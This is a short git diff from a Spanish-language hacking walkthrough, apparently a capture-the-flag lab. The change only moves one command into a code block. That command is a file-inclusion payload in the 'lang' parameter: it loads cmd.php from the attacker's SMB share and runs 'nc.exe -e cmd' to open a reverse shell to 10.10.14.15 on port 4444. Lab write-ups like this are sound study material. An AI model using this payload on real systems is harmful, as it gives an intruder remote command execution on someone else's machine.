@@ -56,7 +56,9 @@ Una vez todo lo anterior esté preparado nos pondremos en escucha por el puerto 
 
 Bien, ahora podemos pasar de nuevo a la web, pero ahora cambiaremos un poco el anterior comando, dejando el parámetro `lang` así:
 
-- `lang=\\10.10.14.15\share\cmd.php&cmd=\\10.10.14.15\share\nc.exe -e cmd 10.10.14.15 4444`
+```
+lang=\\10.10.14.15\share\cmd.php&cmd=\\10.10.14.15\share\nc.exe -e cmd 10.10.14.15 4444
+```
 
 Tras unos segundos de espera veremos que nos pudimos entablar la conexión.
 
